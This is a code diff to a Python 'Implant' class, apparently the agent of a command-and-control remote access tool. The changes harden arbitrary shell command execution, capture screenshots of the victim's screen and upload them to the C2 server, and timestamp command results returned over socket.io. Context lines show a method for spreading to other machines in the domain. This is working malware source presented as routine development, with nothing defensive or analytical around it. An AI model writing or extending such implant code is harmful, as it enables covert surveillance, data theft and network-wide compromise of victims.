@@ -112,13 +112,27 @@ class Implant:
                     shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    text=True
+                    text=True,
+                    encoding='utf-8',
+                    errors='replace'
                 )
                 stdout, stderr = process.communicate(timeout=30)
-                return stdout if stdout else stderr
+                
+                # Format command output
+                output = []
+                if stdout:
+                    output.append("STDOUT:")
+                    output.append(stdout)
+                if stderr:
+                    output.append("STDERR:")
+                    output.append(stderr)
+                
+                return "\n".join(output) if output else "Command executed successfully (no output)"
+        except subprocess.TimeoutExpired:
+            return "Command timed out after 30 seconds"
         except Exception as e:
             logger.error(f"Command execution failed: {e}")
-            return str(e)
+            return f"Error executing command: {str(e)}"
     
     def handle_upload(self, filename):
         """Handle file upload to implant"""
@@ -157,22 +171,39 @@ class Implant:
         try:
             # Take screenshot
             screenshot = ImageGrab.grab()
-            # Convert to bytes
+            
+            # Convert to bytes with compression
             img_byte_arr = BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
+            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=85)
             img_byte_arr = img_byte_arr.getvalue()
             
+            # Generate unique filename with timestamp
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"screenshot_{self.hostname}_{timestamp}.png"
+            
             # Upload to C2 server
-            files = {'file': ('screenshot.png', img_byte_arr)}
+            files = {'file': (filename, img_byte_arr)}
             response = requests.post(
                 f"{self.c2_url}/api/implants/{self.implant_id}/upload",
                 files=files
             )
+            
             if response.status_code == 200:
-                return "Screenshot captured and uploaded successfully"
-            return f"Failed to upload screenshot: {response.status_code}"
+                # Return both success message and filename for the web interface
+                return json.dumps({
+                    'status': 'success',
+                    'message': 'Screenshot captured and uploaded successfully',
+                    'filename': filename
+                })
+            return json.dumps({
+                'status': 'error',
+                'message': f"Failed to upload screenshot: {response.status_code}"
+            })
         except Exception as e:
-            return f"Screenshot failed: {e}"
+            return json.dumps({
+                'status': 'error',
+                'message': f"Screenshot failed: {str(e)}"
+            })
     
     def spread_to_domain(self):
         """Attempt to spread to other machines in the domain"""
@@ -245,7 +276,8 @@ class Implant:
                 self.sio.emit('command_result', {
                     'implant_id': self.implant_id,
                     'command': command,
-                    'result': result
+                    'result': result,
+                    'timestamp': datetime.now().isoformat()
                 })
             except queue.Empty:
                 continue
